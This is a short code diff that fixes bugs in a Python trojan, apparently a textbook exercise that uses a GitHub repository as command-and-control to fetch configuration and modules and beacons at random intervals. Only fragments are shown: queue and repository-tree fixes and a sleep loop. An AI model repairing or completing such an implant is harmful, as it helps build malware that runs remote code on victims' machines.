@@ -20,7 +20,7 @@ trojan_config = "%s.json" % trojan_id
 data_path = "chapter7/data/%s/" % trojan_id
 trojan_modules = []
 configured = False
-task_queue = queue.queue()
+task_queue = queue.Queue()
 
 
 # 通过账号密码连接到github，获取repo和branch
@@ -35,7 +35,8 @@ def connect_to_github():
 def get_file_contents(filepath):
 
     gh, repo, branch = connect_to_github()
-    tree = branch.commit.commit.tree.recurse()
+    tree = branch.commit.commit.tree.to_tree().recurse()
+
 
     for filename in tree.tree:
 
@@ -126,6 +127,5 @@ while True:
             time.sleep(random.randint(1,10))
 
     time.sleep(random.randint(1000,10000))
-
 
 
